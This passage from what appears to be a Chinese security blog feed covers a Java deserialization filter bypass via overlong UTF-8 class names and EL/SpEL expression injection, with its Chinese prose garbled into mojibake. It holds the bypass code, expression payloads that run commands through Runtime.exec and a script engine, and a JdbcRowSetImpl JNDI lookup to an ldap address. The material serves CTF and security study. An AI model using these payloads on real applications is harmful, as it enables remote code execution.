class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>            put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>            put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>            put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>            put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>            put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>            put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>            put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>            put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa8</span>&#125;);<br>            put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>            put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>            put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>            put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>            put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>            put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>            put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;); <span class="hljs-comment">// 0x6f</span><br>            put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>            put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>            put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>            put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>            put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>            put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>            put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>            put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>            put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>            put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>            put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>            put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>            put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>            put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>            put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>            put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>            put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>            put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>            put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>            put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>            put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>            put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>            put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>            put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>            put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>            put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>            put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>            put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>            put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>            put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>            put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>            put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>            put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>            put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>            put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>            put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>            put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br>        &#125;&#125;;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">UTF8OverlongObjectOutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-built_in">super</span>(out);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeClassDescriptor</span><span class="hljs-params">(ObjectStreamClass desc)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br><span class="hljs-comment">//        writeUTF(desc.getName());</span><br>                writeShort(name.length() * <span class="hljs-number">2</span>);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>                    <span class="hljs-type">char</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> name.charAt(i);<br><span class="hljs-comment">//            System.out.println(s);</span><br>                    write(map.get(s)[<span class="hljs-number">0</span>]);<br>                    write(map.get(s)[<span class="hljs-number">1</span>]);<br>                &#125;<br>                writeLong(desc.getSerialVersionUID());<br>                <span class="hljs-type">byte</span> <span class="hljs-variable">flags</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> ((Boolean) getFieldValue(desc, <span class="hljs-string">&quot;externalizable&quot;</span>)) &#123;<br>                    flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;<br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">protocolField</span> <span class="hljs-operator">=</span> ObjectOutputStream.class.getDeclaredField(<span class="hljs-string">&quot;protocol&quot;</span>);<br>                    protocolField.setAccessible(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> (Integer) protocolField.get(<span class="hljs-built_in">this</span>);<br>                    <span class="hljs-keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;<br>                        flags |= ObjectStreamConstants.SC_BLOCK_DATA;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((Boolean) getFieldValue(desc, <span class="hljs-string">&quot;serializable&quot;</span>)) &#123;<br>                    flags |= ObjectStreamConstants.SC_SERIALIZABLE;<br>                &#125;<br>                <span class="hljs-keyword">if</span> ((Boolean) getFieldValue(desc, <span class="hljs-string">&quot;hasWriteObjectData&quot;</span>)) &#123;<br>                    flags |= ObjectStreamConstants.SC_WRITE_METHOD;<br>                &#125;<br>                <span class="hljs-keyword">if</span> ((Boolean) getFieldValue(desc, <span class="hljs-string">&quot;isEnum&quot;</span>)) &#123;<br>                    flags |= ObjectStreamConstants.SC_ENUM;<br>                &#125;<br>                writeByte(flags);<br>                ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc, <span class="hljs-string">&quot;fields&quot;</span>);<br>                writeShort(fields.length);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; fields.length; i++) &#123;<br>                    <span class="hljs-type">ObjectStreamField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> fields[i];<br>                    writeByte(f.getTypeCode());<br>                    writeUTF(f.getName());<br>                    <span class="hljs-keyword">if</span> (!f.isPrimitive()) &#123;<br>                        <span class="hljs-type">Method</span> <span class="hljs-variable">writeTypeString</span> <span class="hljs-operator">=</span> ObjectOutputStream.class.getDeclaredMethod(<span class="hljs-string">&quot;writeTypeString&quot;</span>, String.class);<br>                        writeTypeString.setAccessible(<span class="hljs-literal">true</span>);<br>                        writeTypeString.invoke(<span class="hljs-built_in">this</span>, f.getTypeString());<br><span class="hljs-comment">//                    writeTypeString(f.getTypeString());</span><br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>suidææƒå‘ç°sudoå¯ç”¨ï¼Œä¸”è®¾ç½®çš„NOPASSWDï¼Œç›´æ¥äº¤äº†ï¼š</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822164657573.png" alt="image-20240822164657573"></p><p>fjé“¾å’Œå†…å­˜é©¬æ‰“æ³•ï¼š<a href="https://blog.csdn.net/uuzeray/article/details/139222583?spm=1001.2014.3001.5501">ã€Webã€‘2024 äº¬éº’CTF ezjvavé¢˜è§£_äº¬éºŸctf webwp-CSDNåšå®¢</a></p><p>Hessianä¸­å…¶å®ä¹Ÿæœ‰è¿™ä¸ªé—®é¢˜ï¼Œè¯¦è§X1å¸ˆå‚…çš„æ–‡ç« <a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/">Hessian UTF-8 Overlong Encoding - X1r0z Blog (exp10it.io)</a></p><p>å‚è€ƒé“¾æ¥è§æ–‡ä¸­ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>El&amp;Spel</title>
    <link href="/2024/08/22/El-Spel/"/>
    <url>/2024/08/22/El-Spel/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åˆè¢«å·åˆ°äº†ï¼Œæ¥ç‚¹è¡¨è¾¾å¼æ³¨å…¥ã€‚</p><p>æˆ‘çœŸçš„å—ä¸äº†å·ç‹—äº†ã€‚ç®€ç›´æ˜¯ç‹ ç‹ pushæˆ‘æ›´æ–°çš„åŠ¨åŠ›å•Šã€‚</p><p>Javaä¸­è¡¨è¾¾å¼æ ¹æ®æ¡†æ¶åˆ†ä¸ºå¥½å¤šç§ï¼Œè¿™é‡Œä»¥JSPè‡ªå¸¦çš„è¡¨è¾¾å¼è¯­è¨€ <code>EL</code> å’Œä½¿ç”¨è¾ƒå¤šçš„Springæ¡†æ¶æ‰€æ”¯æŒçš„<code>SpEL</code>ä¸ºä¾‹ã€‚</p><p>å…¶åŸºæœ¬è¯­æ³•ä¸º<code>$&#123;å˜é‡è¡¨è¾¾å¼&#125;</code>ã€‚</p><h2 id="El-Attack"><a href="#El-Attack" class="headerlink" title="El-Attack"></a>El-Attack</h2><p>ä¸ºäº†ç®€åŒ– JSP é¡µé¢ï¼ŒJSP 2.0 æ–°å¢äº† ELï¼ˆExpression Languageï¼‰è¡¨è¾¾å¼è¯­è¨€ <code>$&#123;ELè¡¨è¾¾å¼&#125;</code></p><p>Tomcatã€Weblogicã€Jettyç­‰Webå®¹å™¨å‡æ”¯æŒELè¡¨è¾¾å¼</p><p>è‹¥ELè¡¨è¾¾å¼æ²¡æœ‰ç”Ÿæ•ˆï¼Œéœ€è¦å¼€å¯ELè¡¨è¾¾å¼</p><ul><li><p>æ³•ä¸€ï¼šå°† page æŒ‡ä»¤ä¸­çš„ <code>isELIgnored</code> å±æ€§è®¾ç½®ä¸º false</p><p><code>&lt;%@ page isELIgnored=&quot;false&quot; %&gt;</code></p></li><li><p>æ³•äºŒï¼š<code>web.xml</code> ä¸­é…ç½® <code>&lt;el-ignored&gt;</code> å…ƒç´ </p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;jsp-property-group&gt;<br>    &lt;url-pattern&gt;*jsp&lt;/url-pattern&gt;<br>    &lt;el-ignored&gt;<span class="hljs-literal">false</span>&lt;/el-ignored&gt;<br>&lt;/jsp-propery-group&gt;<br></code></pre></td></tr></table></figure></li></ul><p>ELè¡¨è¾¾å¼ä¸­æœ‰å¾ˆå¤šå†…ç½®å¯¹è±¡</p><table><thead><tr><th align="left">å†…ç½®å¯¹è±¡</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">pageScope</td><td align="left">è·å– page èŒƒå›´çš„å˜é‡</td></tr><tr><td align="left">requestScope</td><td align="left">è·å– request èŒƒå›´çš„å˜é‡</td></tr><tr><td align="left">sessionScope</td><td align="left">è·å– session èŒƒå›´çš„å˜é‡</td></tr><tr><td align="left">applicationScope</td><td align="left">è·å– application èŒƒå›´çš„å˜é‡</td></tr><tr><td align="left">param</td><td align="left">ç›¸å½“äº request.getParameter(String name)ï¼Œè·å–å•ä¸ªå‚æ•°çš„å€¼</td></tr><tr><td align="left">paramValues</td><td align="left">ç›¸å½“äº request.getParameterValues(String name)ï¼Œè·å–å‚æ•°é›†åˆä¸­çš„å˜é‡å€¼</td></tr><tr><td align="left">header</td><td align="left">ç›¸å½“äº request.getHeader(String name)ï¼Œè·å– HTTP è¯·æ±‚å¤´ä¿¡æ¯</td></tr><tr><td align="left">headerValues</td><td align="left">ç›¸å½“äº request.getHeaders(String name)ï¼Œè·å– HTTP è¯·æ±‚å¤´æ•°ç»„ä¿¡æ¯</td></tr><tr><td align="left">initParam</td><td align="left">ç›¸å½“äº application.getInitParameter(String name)ï¼Œè·å– web.xml æ–‡ä»¶ä¸­çš„å‚æ•°å€¼</td></tr><tr><td align="left">cookie</td><td align="left">ç›¸å½“äº request.getCookies()ï¼Œè·å– cookie ä¸­çš„å€¼</td></tr><tr><td align="left">pageContext</td><td align="left">è¡¨ç¤ºå½“å‰ JSP é¡µé¢çš„ pageContext å¯¹è±¡</td></tr></tbody></table><p>ELè¡¨è¾¾å¼ä¸ä»…å¯ä»¥ä»¥æ–‡æœ¬å…ƒç´ çš„å½¢å¼å‡ºç°ï¼Œä¹Ÿå¯ä»¥å‡ºç°åœ¨Jspæ ‡ç­¾ä¸­</p><h3 id="Jsp-vs-El"><a href="#Jsp-vs-El" class="headerlink" title="Jsp vs El"></a>Jsp vs El</h3><p>ç›¸æ¯”Jspï¼ŒELè¡¨è¾¾å¼çš„æ‰§è¡Œä¼šæ›´åŠ çµæ´»</p><ul><li>workâœ”ï¸</li></ul><blockquote><p>&lt;%</p><p>((ScriptEngineManager)â€â€.getClass().<em>forName</em>(â€œjavax.script.ScriptEngineManagerâ€).newInstance()).getEngineByName(â€œjsâ€).eval(â€œjava.lang.Runtime.getRuntime().exec(â€˜calcâ€™)â€);</p><p>%&gt;</p></blockquote><ul><li>failâœ–ï¸</li></ul><blockquote><p>&lt;% â€œâ€.getClass().<em>forName</em>(â€œjavax.script.ScriptEngineManagerâ€).newInstance().getEngineByName(â€œjsâ€).eval(â€œjava.lang.Runtime.getRuntime().exec(â€˜calcâ€™)â€);</p><p>%&gt;</p><p>The method getEngineByName(String) is undefined for the type</p></blockquote><ul><li>workâœ”ï¸</li></ul><blockquote><p>${â€œâ€.getClass().forName(â€œjavax.script.ScriptEngineManagerâ€).newInstance().getEngineByName(â€œjsâ€).eval(â€œjava.lang.Runtime.getRuntime().exec(â€˜calcâ€™)â€)}</p></blockquote><p>å¯è§ELè¡¨è¾¾å¼èƒ½å¤Ÿè‡ªåŠ¨è¿›è¡Œç±»å‹è½¬æ¢ï¼ŒTomcatå†…ç½®çš„JSPå¼•æ“â€”â€”Apache Jasperå¦‚ä½•æ‰§è¡ŒELè¡¨è¾¾å¼å°±ä¸è·Ÿäº†ã€‚</p><p>ç›´æ¥ç»™å‡ºç»“è®ºï¼š</p><p>è¿™ç§è°ƒç”¨æ–¹å¼è®©æ–¹æ³•ä»¥å­—ç¬¦ä¸²çš„å½¢å¼å‡ºç°ï¼Œå¯ä»¥æŠŠç”¨è°ƒç”¨çš„å‚æ•°é€šè¿‡å¤–éƒ¨å‚æ•°ä¼ å…¥ï¼Œå®ç°æ›´éšè”½çš„ELæ‰§è¡Œ</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-string">&quot;&quot;</span>[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)&#125;<br></code></pre></td></tr></table></figure></blockquote><blockquote><p>a&#x3D;getClass&amp;b&#x3D;forName&amp;c&#x3D;javax.script.ScriptEngineManager&amp;d&#x3D;newInstance&amp;e&#x3D;getEngineByName&amp;f&#x3D;js&amp;g&#x3D;eval&amp;h&#x3D;java.lang.Runtime.getRuntime().exec(â€˜calcâ€™)</p></blockquote><h3 id="Getter-Setter"><a href="#Getter-Setter" class="headerlink" title="Getter &amp; Setter"></a>Getter &amp; Setter</h3><p>ELè¡¨è¾¾å¼ä¸æ”¯æŒ<code>Object a = xxx</code>æ¥å­˜å‚¨ä¸´æ—¶å±€éƒ¨å˜é‡ã€‚å¯ä»¥åˆ©ç”¨å†…ç½®å¯¹è±¡æ¥å­˜å‚¨ã€‚</p><p>å¹¶ä¸”ç‚¹å·å±æ€§å–å€¼ç›¸å½“äºæ‰§è¡Œå¯¹è±¡çš„getteræ–¹æ³•ï¼Œç­‰å·å±æ€§èµ‹å€¼åˆ™ç­‰åŒäºæ‰§è¡Œsetteræ–¹æ³•</p><blockquote><p>${pageContext.setAttribute(â€œobjâ€, â€œâ€.getClass().forName(â€œcom.sun.rowset.JdbcRowSetImplâ€).newInstance());</p><p>pageContext.getAttribute(â€œobjâ€).dataSourceName&#x3D;â€ldap:&#x2F;&#x2F;127.0.0.1:8099&#x2F;aâ€;</p><p>pageContext.getAttribute(â€œobjâ€).autoCommit&#x3D;true}</p></blockquote><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.el.parser.AstAssign#getValue<br></code></pre></td></tr></table></figure><p>-&gt; <code>org.apache.el.parser.AstValue#getValue</code></p><p> -&gt; <code>org.apache.el.parser.AstValue#setValue</code></p><p> -&gt; <code>javax.el.CompositeELResolver#setValue</code></p><p> -&gt; <code>javax.el.BeanELResolver#setValue</code></p></blockquote><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å¯¹åº”äºJSPé¡µé¢ä¸­çš„pageContextå¯¹è±¡</span><br>$&#123;pageContext&#125;<br><span class="hljs-comment">//è·å–Webè·¯å¾„</span><br>$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>)&#125;<br><span class="hljs-comment">//æ–‡ä»¶å¤´å‚æ•°</span><br>$&#123;header&#125;<br><span class="hljs-comment">//è·å–webRoot</span><br>$&#123;applicationScope&#125;<br><span class="hljs-comment">//æ‰§è¡Œå‘½ä»¤</span><br>$&#123;pageContext.setAttribute(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass()).invoke(<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&quot;calc.exe&quot;</span>))&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦è¿˜æ˜¯é€šè¿‡åå°„çš„æ–¹å¼å»å‘½ä»¤æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ScriptEngineè°ƒç”¨JSå¼•æ“ç»•è¿‡è¿‡æ»¤ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>).eval(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><h2 id="SpEL-Attack"><a href="#SpEL-Attack" class="headerlink" title="SpEL-Attack"></a>SpEL-Attack</h2><p>SpELï¼šSpring Expression Language ä¸€ç§è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ï¼Œç±»ä¼¼äºELè¡¨è¾¾å¼ã€‚</p><p>SpEL çš„è¯ç”Ÿæ˜¯ä¸ºäº†ç»™ Spring ç¤¾åŒºæä¾›ä¸€ç§èƒ½å¤Ÿä¸Spring ç”Ÿæ€ç³»ç»Ÿæ‰€æœ‰äº§å“æ— ç¼å¯¹æ¥ï¼Œèƒ½æä¾›ä¸€ç«™å¼æ”¯æŒçš„è¡¨è¾¾å¼è¯­è¨€ã€‚</p><p>SpELåŸºæœ¬è¯­æ³•ï¼š SpELä½¿ç”¨ <code>#&#123;...&#125;</code>ä½œä¸ºå®šç•Œç¬¦ï¼Œå¤§æ‹¬å·å†…è¢«è§†ä¸ºSpELè¡¨è¾¾å¼ï¼Œé‡Œé¢å¯ä»¥ä½¿ç”¨è¿ç®—ç¬¦ï¼Œå˜é‡ï¼Œè°ƒç”¨æ–¹æ³•ç­‰ã€‚ä½¿ç”¨ <code>T()</code> è¿ç®—ç¬¦ä¼šè°ƒç”¨ç±»ä½œç”¨åŸŸçš„æ–¹æ³•å’Œå¸¸é‡ï¼Œå¦‚<code>#&#123;T(java.lang.Math)&#125;</code>è¿”å›ä¸€ä¸ªjava.lang.Mathç±»å¯¹è±¡ã€‚</p><p><code>#&#123;&#125;</code>å’Œ<code>$&#123;&#125;</code>çš„åŒºåˆ«ï¼š</p><ul><li><code>#&#123;&#125;</code> 